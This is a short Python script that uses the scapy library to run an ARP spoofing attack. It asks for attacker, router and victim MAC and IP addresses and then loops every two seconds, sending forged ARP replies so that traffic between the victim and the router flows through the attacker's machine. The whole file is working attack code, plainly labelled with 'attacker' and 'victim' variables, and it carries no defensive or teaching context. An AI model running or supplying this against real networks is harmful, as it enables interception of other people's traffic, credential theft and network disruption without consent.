from scapy.all import ARP, send
from time import sleep


attacker_mac = input("Enter Attacker MAC addr: ") or "CC:47:40:F6:21:E6"
router_ip = input("Enter Router IP addr: ") or "192.168.1.1"
router_mac = input("Enter Router MAC addr: ") or "0c:b9:37:86:7b:7b"
victim_ip = input("Enter Victim IP addr: ") or "192.168.1.10"
victim_mac = input("Enter Victim MAC addr: ") or "b8:81:98:87:11:99"

# Craft ARP reply to victim: "Router is at Attacker_MAC"
arp_to_victim = ARP(op=2, psrc=router_ip, hwsrc=attacker_mac, pdst=victim_ip, hwdst=victim_mac)
# Craft ARP reply to router: "Victim is at Attacker_MAC"
arp_to_router = ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=router_ip, hwdst=router_mac)

def spoof():
    while True:
        send(arp_to_victim, verbose=False)
        send(arp_to_router, verbose=False)
        sleep(2)


if __name__ == "__main__":
    print("Starting ARP spoof")
    spoof()
